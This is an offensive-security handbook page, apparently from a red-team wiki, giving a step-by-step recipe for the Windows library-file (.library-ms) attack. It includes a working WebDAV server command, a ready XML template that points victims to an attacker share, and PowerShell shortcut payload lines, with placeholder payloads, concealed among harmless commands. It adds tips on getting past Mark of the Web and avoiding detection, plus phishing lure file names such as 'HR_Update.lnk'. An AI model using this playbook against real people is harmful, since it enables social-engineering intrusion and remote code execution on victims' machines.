---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: true
---

# Evil Windows Library File

A lesser-known client-side attack vector for breaching a target’s perimeter involves the use of an Evil Library File Attack.

In this attack, the victim is sent a specially crafted Windows library file (`.library-ms`) that, when opened, connects to a WebDAV share controlled by the attacker. Within this share is a malicious shortcut (`.lnk`) file, which once opened executes a PowerShell command on the victim’s machine. Some level of social engineering will be required to persuade the target to open the library file.

The use of a library file instead of directly sending the shortcut file (e.g., via email) is critical. Sending a shortcut file directly would typically result in it being flagged with the [Mark of the Web (MOTW)](https://learn.microsoft.com/en-us/microsoft-365-apps/security/internet-macros-blocked), which hinders or blocks execution. Library files, on the other hand, are often overlooked by security mechanisms, making them a more stealthy vehicle for delivering the payload.

***

## Exploitation

{% stepper %}
{% step %}
### Setup WebDav Share

First, we need to set up a WebDAV share on a machine we control that the target can connect to.

We can use the `wsgidav` tool to start a server listening on all interfaces and without authentication:

```bash
sudo apt install python3-wsgidav # If it's not installed already
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root <webadm-root>
```

Take note of the WebDAV share address (printed in the output), as we’ll need it in the next steps.
{% endstep %}

{% step %}
### Creating the Shortcut

On a Windows machine, create a malicious `.lnk` shortcut that will be served from the WebDAV share to achieve remote code execution.

Right-click on the desktop, choose `New → Shortcut`, and when prompted for the location, use a PowerShell payload:

```powershell
powershell.exe -c "<payload>"
# OR
powershell.exe -e "<base64-payload>"
```

To make the command appear less suspicious, we can conceal our malicious payload among several harmless-looking commands, making it harder to spot if the victim inspects the shortcut’s target.

{% code overflow="wrap" %}
```powershell
powershell.exe -c "Get-ChildItem C:\Users; Get-Process | Out-Null; Start-Sleep -s 2; <payload>; Get-Date"
```
{% endcode %}

{% hint style="warning" %}
By default, shortcut locations can be at most 260 characters long, which is too short for most LOTL reverse shell payloads. In which case, try employing a reverse shell that uses a cradle, like ConPtyShell.
{% endhint %}

After creating the shortcut, move it into your WebDAV share so it’s accessible to the target.
{% endstep %}

{% step %}
### Creating the LIbrary File

Next, we’ll craft a `.library-ms` file on a Windows machine that, when opened, will point to our WebDAV share.

Use a text editor to create the following XML file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>1337</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1000</iconReference>
<templateInfo>
<folderType>{5f4eab9a-6833-4f61-899d-31cf46979d49}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>CHANGE_ME</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

Be sure to replace `CHANGE_ME` with the actual URL of your WebDAV share.

You can modify the following tags to better fit your social engineering scenario:

<table><thead><tr><th width="169">Tag</th><th>Description</th></tr></thead><tbody><tr><td><code>&#x3C;name></code></td><td>Use <code>@windows.storage.dll,-34582</code> or <code>@shell32.dll,-34575</code>.<br>The former may help avoid detection.</td></tr><tr><td><code>&#x3C;version></code></td><td>Arbitrary, the user won’t see this value.</td></tr><tr><td><code>&#x3C;iconReference></code></td><td>Change the number to alter the icon:<br>- Default folder icon: <code>-1000</code><br>- Document folder icon: <code>-1002</code><br>- Picture folder icon: <code>-1003</code><br>- Music folder icon: <code>-1004</code><br>- Video folder icon: <code>-1005</code></td></tr><tr><td><code>&#x3C;folderType></code></td><td>Adjust the GUID to change the folder type appearance. See <a href="https://learn.microsoft.com/en-us/windows/win32/shell/schema-library-foldertype">Microsoft’s documentation</a> for options. Examples:<br>- Generic Library: <code>{5f4eab9a-6833-4f61-899d-31cf46979d49}</code><br>- Users Libraries: <code>{C4D98F09-6124-4fe0-9942-826416082DA9}</code><br>- Documents Folder: <code>{7D49D726-3C21-4F05-99AA-FDC2C9474656}</code><br>- Pictures Folder: <code>{B3690E58-E961-423B-B687-386EBFD83239}</code><br>- Videos Folder: <code>{5fa96407-7e77-483c-ac93-691d05850de8}</code><br>- Games Folder: <code>{b689b0d0-76d3-4cbb-87f7-585d0e0ce070}</code><br>- Music Folder: <code>{94d6ddcc-4a68-4175-a374-bd584a510b78}</code><br>- Contacts: <code>{DE2B70EC-9BF7-4A93-BD3D-243F7881D492}</code></td></tr></tbody></table>

{% hint style="warning" %}
When the file is first opened, a `serialized` tag is added to the XML, making the WebDAV share appear empty when accessed by other users or after a reboot, effectively stopping the attack. The file is disposable in that sense.
{% endhint %}
{% endstep %}

{% step %}
### Social Engineering

To increase the likelihood of success, you’ll need a convincing narrative to persuade the target to open both the library and shortcut files.

Choose an icon and folder type for the library file that matches your story. For example, if posing as a shared media folder, use a video or music folder appearance.

For the malicious shortcut, come up with a believable reason for the victim to click it. Potential disguises include:

* `bitcoin_wallet.lnk`
* `HR_Update.lnk`
* `VPN_Setup.lnk`
* `RequiredSecurityPatch.lnk`

After that, send the library file to your victims.
{% endstep %}
{% endstepper %}
